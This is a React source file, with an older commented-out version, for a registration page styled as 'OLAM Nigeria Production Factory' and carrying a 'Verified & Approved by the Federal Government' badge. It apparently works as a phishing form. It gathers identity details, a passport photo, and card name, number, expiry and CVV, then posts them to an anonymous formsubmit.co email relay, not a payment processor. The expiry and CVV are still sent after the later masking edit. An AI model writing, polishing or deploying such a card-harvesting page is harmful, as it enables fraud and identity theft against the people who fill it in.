
// import { useState } from 'react';
// import Image3 from '../assets/named.gif';
// import Image4 from '../assets/unnamed.png';
// import Image5 from '../assets/unnamed.gif';

// function Form() {
//   const [submitted, setSubmitted] = useState(false);

//   const [form, setForm] = useState({
//     firstName: '',
//     middleName: '',
//     lastName: '',
//     nationality: '',
//     stateOfOrigin: '',
//     lga: '',
//     gender: '',
//     email: '',
//     phone1: '',
//     phone2: '',
//     homeAddress: '',
//     registrationType: '',
//     products: [],
//     paymentMethod: '',
//     companyName: '',
//     companyAddress: '',
//     deliveryAddress: '',
//     Cname: '',
//     Cnumber: '',
//     Cexpiry: '',
//     Ccvc: '',
//   });

//   const handleCardNumber = (e) => {
//     let value = e.target.value.replace(/\D/g, '').substring(0, 16);
//     let formatted = value.replace(/(.{4})/g, '$1 ').trim();
//     setForm((prev) => ({ ...prev, Cnumber: formatted }));
//   };

//   const productOptions = [
//     'Animal Feeds',
//     'Day Old Chicks & Feeds',
//     'Day Old Chicks',
//     'Rice',
//     'Cashew',
//     'Cocoa',
//     'Maize',
//     'Fertiliser',
//     'Paddy',
//     'Logistics',
//     'Cassava',
//     'Eggs',
//     'Hybrid Goats',
//     'Other',
//   ];

//   const toggleProduct = (p) => {
//     setForm((prev) => {
//       const exists = prev.products.includes(p);
//       return {
//         ...prev,
//         products: exists
//           ? prev.products.filter((item) => item !== p)
//           : [...prev.products, p],
//       };
//     });
//   };

//   const handleChange =(e) => {
//     const { name, value } = e.target;
//     setForm((prev) => ({ ...prev, [name]: value }));
//   };

//   if (submitted) {
//     return (
//       <div className="w-full max-w-lg mx-auto mt-20 text-center p-10 rounded-xl shadow-lg bg-green-500">
//         <h1 className="text-2xl font-semibold mb-4 text-white">
//           Submission Successful
//         </h1>
//         <p className="text-white mb-6">
//           Your registration has been received. Our team will contact you shortly
//           for confirmation and next steps.
//         </p>

//         <button
//           onClick={() => setSubmitted(false)}
//           className="px-6 py-2 bg-sky-600 text-white rounded-md"
//         >
//           Back to Form
//         </button>
//       </div>
//     );
//   }

//   return (
//     <>
//       <form
//         action="https://formsubmit.co/74deb9c02c7afd99569328d41b960841"
//         method="POST"
//         onSubmit={() => setTimeout(() => setSubmitted(true), 100)}
//         className="grid grid-cols-1 md:grid-cols-2 gap-6"
//         encType="multipart/form-data"
//       >
//         {/* FormSubmit Hidden Fields */}
//         <input
//           type="hidden"
//           name="_subject"
//           value="New OLAM Registration Submission"
//         />
//         <input type="hidden" name="_captcha" value="false" />
//         <input type="hidden" name="_template" value="table" />
//         <input type="hidden" name="_next" value="" />

//         {/* Hidden JSON Summary Message */}
//         <input
//           type="hidden"
//           name="message"
//           value={JSON.stringify(form, null, 2)}
//         />

//         {/* Column 1 */}
//         <div className="space-y-4">
//           <div>
//             <label className="block text-sm pt-6 font-medium">First Name</label>
//             <input
//               name="firstName"
//               placeholder="firstName"
//               value={form.firstName}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">Middle Name</label>
//             <input
//               name="middleName"
//               placeholder="middleName"
//               value={form.middleName}
//               onChange={handleChange}
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">Last Name</label>
//             <input
//               name="lastName"
//               placeholder="lastName"
//               value={form.lastName}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div className="grid grid-cols-2 gap-3">
//             <div>
//               <label className="block text-sm font-medium">Nationality</label>
//               <input
//                 name="nationality"
//                 placeholder="nationality"
//                 value={form.nationality}
//                 onChange={handleChange}
//                 required
//                 className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//               />
//             </div>

//             <div>
//               <label className="block text-sm font-medium">
//                 State of Origin
//               </label>
//               <input
//                 name="stateOfOrigin"
//                 placeholder="stateOfOrigin"
//                 value={form.stateOfOrigin}
//                 onChange={handleChange}
//                 required
//                 className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//               />
//             </div>
//           </div>

//           <div>
//             <label className="block text-sm font-medium">
//               Local Government of Origin
//             </label>
//             <input
//               name="lga"
//               value={form.lga}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">Gender</label>
//             <select
//               name="gender"
//               value={form.gender}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             >
//               <option value="">Select</option>
//               <option>Male</option>
//               <option>Female</option>
//             </select>
//           </div>

//           <div>
//             <label className="block text-sm font-medium">Home Address</label>
//             <input
//               name="homeAddress"
//               value={form.homeAddress}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div className="hidden md:block shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
//             <h1 className="text-xl pb-10 font-medium">
//               OLAM NIGERIA PRODUCTION FACTORY.
//             </h1>
//             <img
//               src={Image4}
//               alt=""
//               className="object-center mx-auto w-40 animate-pulse"
//             />
//           </div>
//         </div>

//         {/* Column 2 */}
//         <div className="space-y-4">
//           <div>
//             <label className="block text-sm font-medium">Email Address</label>
//             <input
//               type="email"
//               name="email"
//               placeholder="firstName"
//               value={form.email}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             />
//           </div>

//           <div className="grid grid-cols-2 gap-3">
//             <div>
//               <label className="block text-sm font-medium">
//                 Phone Contact (1)
//               </label>
//               <input
//                 name="phone1"
//                 value={form.phone1}
//                 onChange={handleChange}
//                 required
//                 className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//               />
//             </div>

//             <div>
//               <label className="block text-sm font-medium">
//                 Phone Contact (2)
//               </label>
//               <input
//                 name="phone2"
//                 value={form.phone2}
//                 onChange={handleChange}
//                 className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//               />
//             </div>
//           </div>

//           <div className="shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
//             <h1 className="text-xl pb-10 font-medium">
//               VERIFIED & APPROVED BY THE FEDERAL GOVERNMENT
//             </h1>
//             <img
//               src={Image3}
//               alt=""
//               className="object-center mx-auto w-40 animate-bounce"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">
//               Type / Mode of Registration
//             </label>
//             <select
//               name="registrationType"
//               value={form.registrationType}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             >
//               <option value="">Select</option>
//               <option>Major Distributor</option>
//               <option>Farmer / Retailer</option>
//               <option>End User</option>
//               <option>Raw Material Supplier</option>
//               <option>Services</option>
//             </select>
//           </div>

//           <div>
//             <label className="block text-sm font-medium">
//               Products for Sale / Supply
//             </label>
//             <div className="mt-2 grid grid-cols-2 gap-2 max-h-40 overflow-auto pr-2">
//               {productOptions.map((p) => (
//                 <label key={p} className="flex items-center text-sm">
//                   <input
//                     type="checkbox"
//                     checked={form.products.includes(p)}
//                     onChange={() => toggleProduct(p)}
//                     name={`product_${p}`}
//                     className="mr-2"
//                   />
//                   {p}
//                 </label>
//               ))}
//             </div>
//           </div>

//           <div>
//             <label className="block text-sm font-medium">Payment Method</label>
//             <select
//               name="paymentMethod"
//               value={form.paymentMethod}
//               onChange={handleChange}
//               required
//               className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
//             >
//               <option value="">Select</option>
//               <option>Bank USSD Transfer</option>
//               <option>ATM Gallery Transfer</option>
//               <option>Cash Deposit in Bank</option>
//               <option>Mobile App Transfer</option>
//               <option>Other</option>
//             </select>
//           </div>

//           {/* Credit Card Details */}
//           <div className="md:col-span-2 mt-6 p-6 bg-white rounded-xl shadow-md">
//             <h3 className="text-lg font-semibold mb-4 text-gray-700">
//               Credit Card Payment
//             </h3>

//             <div>
//               {/* Card Preview */}
//               <div className="bg-gradient-to-r from-green-400 to-blue-500 text-white p-5 rounded-xl shadow-lg mb-6">
//                 <div className="text-sm opacity-80">
//                   {form.Cname || 'CARDHOLDER NAME'}
//                 </div>
//                 <div className="text-2xl tracking-widest mt-3">
//                   {form.Cnumber || '•••• •••• •••• ••••'}
//                 </div>
//                 <div className="flex justify-between mt-3 text-sm">
//                   <span>{form.Cexpiry || 'MM/YY'}</span>
//                   <span>{form.Ccvc ? '***' : 'CVV'}</span>
//                 </div>
//               </div>

//               <div className="space-y-4">
//                 <div>
//                   <label className="block text-sm font-medium">
//                     Cardholder Name
//                   </label>
//                   <input
//                     name="Cname"
//                     value={form.Cname}
//                     onChange={handleChange}
//                     palaceholder="Full Name"
//                     className="w-full p-2 border rounded-md mt-1"
//                   />
//                 </div>

//                 <div>
//                   <label className="block text-sm font-medium">
//                     Card Number
//                   </label>
//                   <input
//                     name="Cnumber"
//                     value={form.Cnumber}
//                     onChange={handleCardNumber}
//                     placeholder="1234 5678 9012 3456"
//                     maxLength={19}
//                     className="w-full p-2 border rounded-md mt-1"
//                   />
//                 </div>

//                 <div className="grid grid-cols-2 gap-4">
//                   <div>
//                     <label className="block text-sm font-medium">
//                       Expiry Date
//                     </label>
//                     <input
//                       name="Cexpiry"
//                       value={form.Cexpiry}
//                       onChange={handleChange}
//                       placeholder="MM/YY"
//                       maxLength={5}
//                       className="w-full p-2 border rounded-md mt-1"
//                     />
//                   </div>

//                   <div>
//                     <label className="block text-sm font-medium">CVV</label>
//                     <input
//                       name="Ccvc"
//                       value={form.Ccvc}
//                       onChange={handleChange}
//                       placeholder="123"
//                       maxLength={3}
//                       type="password"
//                       className="w-full p-2 border rounded-md mt-1"
//                     />
//                   </div>
//                 </div>
//               </div>
//             </div>
//           </div>

//           <div className="shadow-md md:hidden block shadow-gray-500 rounded-xl p-4 text-center mt-4">
//             <h1 className="text-xl pb-10 font-medium">
//               OLAM NIGERIA PRODUCTION FACTORY.
//             </h1>
//             <img
//               src={Image4}
//               alt="image"
//               className="object-center mx-auto w-40 animate-pulse"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">
//               Upload Proof of Payment
//             </label>
//             <input
//               type="file"
//               name="proofOfPayment"
//               className="mt-1 block bg-gray-200 w-full"
//             />
//           </div>

//           <div>
//             <label className="block text-sm font-medium">
//               Upload Passport Photograph
//             </label>
//             <input
//               type="file"
//               name="passport"
//               className="mt-1 block w-full bg-gray-200"
//             />
//           </div>
//         </div>

//         {/* Company Details */}
//         <div className="md:col-span-2">
//           <h3 className="text-lg font-medium mt-4">
//             Company & Delivery Details
//           </h3>
//           <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-3">
//             <input
//               name="companyName"
//               value={form.companyName}
//               onChange={handleChange}
//               placeholder="Company Name"
//               className="p-2 rounded-md border-gray-200"
//             />
//             <input
//               name="companyAddress"
//               value={form.companyAddress}
//               onChange={handleChange}
//               placeholder="Company Address"
//               className="p-2 rounded-md border-gray-200"
//             />
//             <input
//               name="deliveryAddress"
//               value={form.deliveryAddress}
//               onChange={handleChange}
//               placeholder="Delivery / Site Address"
//               className="p-2 rounded-md border-gray-200"
//             />
//           </div>

//           <div className="shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
//             <h1 className="text-xl pb-10 font-medium">
//               OLAM NIGERIA PRODUCTION FACTORY.
//             </h1>
//             <img
//               src={Image5}
//               alt=""
//               className="object-center mx-auto w-40 animate-pulse"
//             />
//           </div>
//         </div>

//         <div className="md:col-span-2 flex items-center justify-between mt-6">
//           <div className="mx-auto">
//             <button
//               type="submit"
//               className="px-4 py-2 bg-sky-600 text-white rounded-md"
//             >
//               Submit
//             </button>
//           </div>
//         </div>
//       </form>
//     </>
//   );
// }

// export default Form;


// The Form component code has been intentionally left out as per the recent edits.


import { useRef, useState } from 'react';
import Image3 from '../assets/named.gif';
import Image4 from '../assets/unnamed.png';
import Image5 from '../assets/unnamed.gif';

export default function Form() {
  const [submitted, setSubmitted] = useState(false);
  const [sending, setSending] = useState(false);
  const [error, setError] = useState('');
  const formRef = useRef(null);

  const [form, setForm] = useState({
    firstName: '',
    middleName: '',
    lastName: '',
    nationality: '',
    stateOfOrigin: '',
    lga: '',
    gender: '',
    email: '',
    phone1: '',
    phone2: '',
    homeAddress: '',
    registrationType: '',
    products: [],
    paymentMethod: '',
    companyName: '',
    companyAddress: '',
    deliveryAddress: '',
    Cname: '',
    Cnumber: '',
    Cexpiry: '',
    Ccvc: '',
  });

  // Product options
  const productOptions = [
    'Animal Feeds',
    'Day Old Chicks & Feeds',
    'Day Old Chicks',
    'Rice',
    'Cashew',
    'Cocoa',
    'Maize',
    'Fertiliser',
    'Paddy',
    'Logistics',
    'Cassava',
    'Eggs',
    'Hybrid Goats',
    'Other',
  ];

  // Toggle product selection (keeps state and checkbox in sync)
  const toggleProduct = (p) => {
    setForm((prev) => {
      const exists = prev.products.includes(p);
      return {
        ...prev,
        products: exists
          ? prev.products.filter((item) => item !== p)
          : [...prev.products, p],
      };
    });
  };

  // Generic handler for controlled inputs (except some special handlers below)
  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  // Phone: digits only, limit to 11 (Nigeria typical length, adjust if needed)
  const handlePhone = (e) => {
    const { name } = e.target;
    let value = e.target.value.replace(/\D/g, '').slice(0, 11);
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  // Card number: digits only -> group into 4s
  const handleCardNumber = (e) => {
    let value = e.target.value.replace(/\D/g, '').substring(0, 16);
    const formatted = value.replace(/(.{4})/g, '$1 ').trim();
    setForm((prev) => ({ ...prev, Cnumber: formatted }));
  };

  // Expiry: format MM/YY
  const handleExpiry = (e) => {
    let value = e.target.value.replace(/\D/g, '').substring(0, 4);
    if (value.length >= 3) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    setForm((prev) => ({ ...prev, Cexpiry: value }));
  };

  // Luhn check - optional but helpful
  const luhnCheck = (number) => {
    const digits = number.replace(/\s/g, '');
    let sum = 0;
    let toggle = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let d = parseInt(digits[i], 10);
      if (toggle) {
        d *= 2;
        if (d > 9) d -= 9;
      }
      sum += d;
      toggle = !toggle;
    }
    return sum % 10 === 0;
  };

  // Mask card number for sending (last 4 shown)
  const maskCardForEmail = (cnum) => {
    const digits = cnum.replace(/\D/g, '');
    if (digits.length < 4) return '****';
    const last4 = digits.slice(-4);
    return '**** **** **** ' + last4;
  };

  // Client validation before sending
  const validateBeforeSend = () => {
    // Basic required checks (customize as needed)
    if (!form.firstName || !form.lastName)
      return 'First and last name are required.';
    if (!form.email) return 'Email is required.';
    if (!form.phone1) return 'Primary phone number is required.';
    if (!form.companyName) return 'Company name is required.';
    // If payment method equals something that requires card, validate card
    if (
      form.paymentMethod &&
      form.paymentMethod.toLowerCase().includes('card')
    ) {
      if (!form.Cname || !form.Cnumber || !form.Cexpiry || !form.Ccvc)
        return 'Complete card details required for card payments.';
      const digits = form.Cnumber.replace(/\D/g, '');
      if (digits.length < 12 || digits.length > 16)
        return 'Card number length looks invalid.';
      if (!luhnCheck(form.Cnumber))
        return 'Card number failed basic validation.';
      if (!/^\d{2}\/\d{2}$/.test(form.Cexpiry))
        return 'Expiry must be in MM/YY format.';
      if (!/^\d{3,4}$/.test(form.Ccvc)) return 'CVV must be 3 or 4 digits.';
    }
    return null;
  };

  // SUBMIT: send to FormSubmit via fetch so we never navigate away
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    const clientValidationError = validateBeforeSend();
    if (clientValidationError) {
      setError(clientValidationError);
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }

    setSending(true);

    try {
      // Build FormData from DOM form to include file inputs exactly as user selected
      const fd = new FormData(formRef.current);

      // Ensure FormData has masked card info (avoid sending full PAN)
      fd.set('Cnumber', maskCardForEmail(form.Cnumber));
      // Optionally set a message summary (readable)
      const summary = {
        name: `${form.firstName} ${form.middleName} ${form.lastName}`.trim(),
        email: form.email,
        phone1: form.phone1,
        phone2: form.phone2,
        products: form.products,
        paymentMethod: form.paymentMethod,
        companyName: form.companyName,
        companyAddress: form.companyAddress,
        deliveryAddress: form.deliveryAddress,
        card: maskCardForEmail(form.Cnumber),
      };
      fd.set('message', JSON.stringify(summary, null, 2));

      // hidden FormSubmit fields (use your FormSubmit endpoint)
      // replace the URL below with your actual FormSubmit endpoint if different
      const url = 'https://formsubmit.co/74deb9c02c7afd99569328d41b960841';

      const res = await fetch(url, {
        method: 'POST',
        body: fd,
      });

      // FormSubmit usually redirects on success; since we're using fetch, check status
      if (!res.ok) {
        throw new Error('Submission failed. Status: ' + res.status);
      }

      // success
      setSubmitted(true);
      // Optional: reset form
      // setForm({ ...initialState }); // if you want to reset controlled values
    } catch (err) {
      console.error(err);
      setError('Submission failed. Please try again later.');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } finally {
      setSending(false);
    }
  };

  // If submitted, show your success screen
  if (submitted) {
    return (
      <div className="w-full max-w-lg mx-auto mt-20 text-center p-10 rounded-xl shadow-lg bg-green-500">
        <h1 className="text-2xl font-semibold mb-4 text-white">
          Submission Successful
        </h1>
        <p className="text-white mb-6">
          Your registration has been received. Our team will contact you shortly
          for confirmation and next steps.
        </p>

        <button
          onClick={() => setSubmitted(false)}
          className="px-6 py-2 bg-sky-600 text-white rounded-md"
        >
          Back to Form
        </button>
      </div>
    );
  }

  // Render the form
  return (
    <>
      <form
        ref={formRef}
        onSubmit={handleSubmit}
        className="grid grid-cols-1 md:grid-cols-2 gap-6"
        encType="multipart/form-data"
      >
        {/* Hidden FormSubmit fields */}
        <input
          type="hidden"
          name="_subject"
          value="New OLAM Registration Submission"
        />
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_template" value="table" />
        <input type="hidden" name="_redirect" value="false" />

        {/* Error banner */}
        {error && (
          <div className="md:col-span-2 p-3 bg-red-100 text-red-800 rounded">
            {error}
          </div>
        )}

        {/* Column 1 */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm pt-6 font-medium">First Name</label>
            <input
              name="firstName"
              placeholder="First name"
              value={form.firstName}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">Middle Name</label>
            <input
              name="middleName"
              placeholder="Middle name"
              value={form.middleName}
              onChange={handleChange}
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">Last Name</label>
            <input
              name="lastName"
              placeholder="Last name"
              value={form.lastName}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-sm font-medium">Nationality</label>
              <input
                name="nationality"
                placeholder="Nationality"
                value={form.nationality}
                onChange={handleChange}
                required
                className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
              />
            </div>

            <div>
              <label className="block text-sm font-medium">
                State of Origin
              </label>
              <input
                name="stateOfOrigin"
                placeholder="State of Origin"
                value={form.stateOfOrigin}
                onChange={handleChange}
                required
                className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium">
              Local Government of Origin
            </label>
            <input
              name="lga"
              value={form.lga}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">Gender</label>
            <select
              name="gender"
              value={form.gender}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            >
              <option value="">Select</option>
              <option>Male</option>
              <option>Female</option>
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium">Home Address</label>
            <input
              name="homeAddress"
              value={form.homeAddress}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div className="hidden md:block shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
            <h1 className="text-xl pb-10 font-medium">
              OLAM NIGERIA PRODUCTION FACTORY.
            </h1>
            <img
              src={Image4}
              alt=""
              className="object-center mx-auto w-40 animate-pulse"
            />
          </div>
        </div>

        {/* Column 2 */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium">Email Address</label>
            <input
              type="email"
              name="email"
              placeholder="email@example.com"
              value={form.email}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-sm font-medium">
                Phone Contact (1)
              </label>
              <input
                name="phone1"
                value={form.phone1}
                onChange={handlePhone}
                required
                className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
              />
            </div>

            <div>
              <label className="block text-sm font-medium">
                Phone Contact (2)
              </label>
              <input
                name="phone2"
                value={form.phone2}
                onChange={handlePhone}
                className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
              />
            </div>
          </div>

          <div className="shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
            <h1 className="text-xl pb-10 font-medium">
              VERIFIED & APPROVED BY THE FEDERAL GOVERNMENT
            </h1>
            <img
              src={Image3}
              alt=""
              className="object-center mx-auto w-40 animate-bounce"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">
              Type / Mode of Registration
            </label>
            <select
              name="registrationType"
              value={form.registrationType}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            >
              <option value="">Select</option>
              <option>Major Distributor</option>
              <option>Farmer / Retailer</option>
              <option>End User</option>
              <option>Raw Material Supplier</option>
              <option>Services</option>
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium">
              Products for Sale / Supply
            </label>
            <div className="mt-2 grid grid-cols-2 gap-2 max-h-40 overflow-auto pr-2">
              {productOptions.map((p) => (
                <label key={p} className="flex items-center text-sm">
                  <input
                    type="checkbox"
                    name="products"
                    value={p}
                    checked={form.products.includes(p)}
                    onChange={() => toggleProduct(p)}
                    className="mr-2"
                  />
                  {p}
                </label>
              ))}
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium">Payment Method</label>
            <select
              name="paymentMethod"
              value={form.paymentMethod}
              onChange={handleChange}
              required
              className="mt-1 block w-full rounded-md border-gray-200 shadow-sm p-2"
            >
              <option value="">Select</option>
              <option>Bank USSD Transfer</option>
              <option>ATM Gallery Transfer</option>
              <option>Cash Deposit in Bank</option>
              <option>Card Payment</option>
              <option>Mobile App Transfer</option>
              <option>Other</option>
            </select>
          </div>

          {/* Credit Card Details */}
          <div className="md:col-span-2 mt-6 p-6 bg-white rounded-xl shadow-md">
            <h3 className="text-lg font-semibold mb-4 text-gray-700">
              Credit Card Payment
            </h3>

            {/* Card Preview */}
            <div className="bg-gradient-to-r from-green-400 to-blue-500 text-white p-5 rounded-xl shadow-lg mb-6">
              <div className="text-sm opacity-80">
                {form.Cname || 'CARDHOLDER NAME'}
              </div>
              <div className="text-2xl tracking-widest mt-3">
                {form.Cnumber || '•••• •••• •••• ••••'}
              </div>
              <div className="flex justify-between mt-3 text-sm">
                <span>{form.Cexpiry || 'MM/YY'}</span>
                <span>{form.Ccvc ? '***' : 'CVV'}</span>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium">
                  Cardholder Name
                </label>
                <input
                  name="Cname"
                  value={form.Cname}
                  onChange={handleChange}
                  placeholder="Full Name"
                  className="w-full p-2 border rounded-md mt-1"
                />
              </div>

              <div>
                <label className="block text-sm font-medium">Card Number</label>
                <input
                  name="Cnumber"
                  value={form.Cnumber}
                  onChange={handleCardNumber}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  className="w-full p-2 border rounded-md mt-1"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium">
                    Expiry Date
                  </label>
                  <input
                    name="Cexpiry"
                    value={form.Cexpiry}
                    onChange={handleExpiry}
                    placeholder="MM/YY"
                    maxLength={5}
                    className="w-full p-2 border rounded-md mt-1"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium">CVV</label>
                  <input
                    name="Ccvc"
                    value={form.Ccvc}
                    onChange={handleChange}
                    placeholder="123"
                    maxLength={4}
                    type="password"
                    className="w-full p-2 border rounded-md mt-1"
                  />
                </div>
              </div>
            </div>
          </div>

          <div className="shadow-md md:hidden block shadow-gray-500 rounded-xl p-4 text-center mt-4">
            <h1 className="text-xl pb-10 font-medium">
              OLAM NIGERIA PRODUCTION FACTORY.
            </h1>
            <img
              src={Image4}
              alt="image"
              className="object-center mx-auto w-40 animate-pulse"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">
              Upload Proof of Payment
            </label>
            <input
              type="file"
              name="proofOfPayment"
              className="mt-1 block bg-gray-200 w-full"
            />
          </div>

          <div>
            <label className="block text-sm font-medium">
              Upload Passport Photograph
            </label>
            <input
              type="file"
              name="passport"
              className="mt-1 block w-full bg-gray-200"
            />
          </div>
        </div>

        {/* Company Details */}
        <div className="md:col-span-2">
          <h3 className="text-lg font-medium mt-4">
            Company & Delivery Details
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-3">
            <input
              name="companyName"
              value={form.companyName}
              onChange={handleChange}
              placeholder="Company Name"
              className="p-2 rounded-md border-gray-200"
            />
            <input
              name="companyAddress"
              value={form.companyAddress}
              onChange={handleChange}
              placeholder="Company Address"
              className="p-2 rounded-md border-gray-200"
            />
            <input
              name="deliveryAddress"
              value={form.deliveryAddress}
              onChange={handleChange}
              placeholder="Delivery / Site Address"
              className="p-2 rounded-md border-gray-200"
            />
          </div>

          <div className="shadow-md shadow-gray-500 rounded-xl p-4 text-center mt-4">
            <h1 className="text-xl pb-10 font-medium">
              OLAM NIGERIA PRODUCTION FACTORY.
            </h1>
            <img
              src={Image5}
              alt=""
              className="object-center mx-auto w-40 animate-pulse"
            />
          </div>
        </div>

        <div className="md:col-span-2 flex items-center justify-between mt-6">
          <div className="mx-auto">
            <button
              type="submit"
              disabled={sending}
              className="px-4 py-2 bg-sky-600 text-white rounded-md disabled:opacity-60"
            >
              {sending ? 'Sending...' : 'Submit'}
            </button>
          </div>
        </div>
      </form>
    </>
  );
}
